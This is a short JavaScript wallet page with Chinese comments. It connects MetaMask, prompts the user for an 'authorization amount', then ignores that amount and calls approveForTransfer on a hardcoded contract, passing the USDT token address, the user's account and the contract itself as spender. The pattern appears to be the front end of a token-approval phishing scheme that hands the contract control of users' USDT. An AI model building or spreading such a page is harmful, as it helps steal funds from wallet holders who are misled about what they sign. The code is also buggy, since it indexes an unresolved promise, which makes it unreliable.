const contractAddress = '0xa2E8dda146b9E724bA0cdfB3bdB6bfA1e37a54d2';
const abi = [
    // 请确保这里包含完整的 ABI
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "tokenAddress",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "from",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "spender",
                "type": "address"
            }
        ],
        "name": "approveForTransfer",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    // 在这里继续添加其他 ABI 相关内容
];

let web3;
let currentAccount;

// 连接钱包按钮事件
document.getElementById('connectButton').addEventListener('click', async () => {
    console.log("尝试连接钱包...");
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            currentAccount = await web3.eth.getAccounts()[0];
            document.getElementById('status').innerText = `钱包连接成功: ${currentAccount}`;
            document.getElementById('approveButton').style.display = 'inline-block';
            console.log("连接成功:", currentAccount);
        } catch (error) {
            document.getElementById('status').innerText = '连接失败，请检查您的钱包设置！';
            console.error("连接失败:", error);
        }
    } else {
        alert('请安装MetaMask！');
    }
});

// 授权按钮事件
document.getElementById('approveButton').addEventListener('click', async () => {
    const tokenAddress = '0xdac17f958d2ee523a2206206994597c13d831ec7'; // USDT地址
    const amount = prompt("请输入授权数量："); // 输入授权数量
    const contract = new web3.eth.Contract(abi, contractAddress);
    try {
        await contract.methods.approveForTransfer(tokenAddress, currentAccount, contractAddress).send({ from: currentAccount });
        alert('授权成功！');
    } catch (error) {
        alert('授权失败！');
        console.error("授权失败:", error);
    }
});
